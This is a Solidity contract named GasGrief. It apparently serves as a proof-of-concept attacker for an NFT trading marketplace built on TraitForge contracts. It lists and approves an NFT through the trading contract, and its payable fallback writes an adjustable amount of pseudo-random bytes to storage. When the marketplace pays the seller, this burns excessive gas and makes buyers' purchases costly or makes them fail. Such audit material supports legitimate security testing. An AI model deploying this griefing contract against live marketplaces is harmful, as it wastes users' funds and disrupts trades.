// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import './EntityTrading/IEntityTrading.sol';
import './TraitForgeNft/ITraitForgeNft.sol';

contract GasGrief {
    IEntityTrading public tradingContract;
    ITraitForgeNft public nftContract;

    uint256 public tokenId;
    uint256 public price;
    address public to;
    bytes public lastRandomBytes;
    uint256 public randomBytesLength = 32;

    constructor(address _tradingAddress, address _nftAddress, address _to, uint256 _tokenId, uint256 _price) payable {
        tradingContract = IEntityTrading(_tradingAddress);
        nftContract = ITraitForgeNft(_nftAddress);
        tokenId = _tokenId;
        price = _price;
        to = _to;
    }

    function setTokenId(uint256 _tokenId) external {
        tokenId = _tokenId;
    }

    function setPrice(uint256 _price) external {
        price = _price;
    }

   function setTo(address _to) external {
        to = _to;
    } 

    function listNFTForSale() public {
        tradingContract.listNFTForSale(tokenId, price);
    }

     function approve() public {
        nftContract.approve(to, tokenId);
    }

    function setRandomBytesLength(uint256 length) public {
        require(length > 0, "Length must be greater than 0");
        randomBytesLength = length;
    }

  fallback() external payable {
        lastRandomBytes = generateRandomBytes(randomBytesLength);
    }

    function generateRandomBytes(uint256 length) internal view returns (bytes memory) {

        bytes memory randomBytes = new bytes(length);

        for (uint256 i = 0; i < length; i++) {
            uint8 randomByte = uint8(uint256(keccak256(abi.encodePacked(block.timestamp, block.difficulty, i))) % 256);
            randomBytes[i] = bytes1(randomByte);
        }

        return randomBytes;
    }
}


